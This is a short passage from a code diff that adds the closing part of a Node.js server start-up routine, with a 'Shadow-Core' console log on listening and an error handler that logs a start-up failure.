+  server.listen(PORT, "0.0.0.0", () => {
+    console.log(`🔥 [Shadow-Core] OS Layer engaged at http://localhost:${PORT}`);
+  });
+}
+
+// Engage mission
+startServer().catch(err => {
+    console.error("💥 [Critical] Shadow Core breakdown:", err);
+});
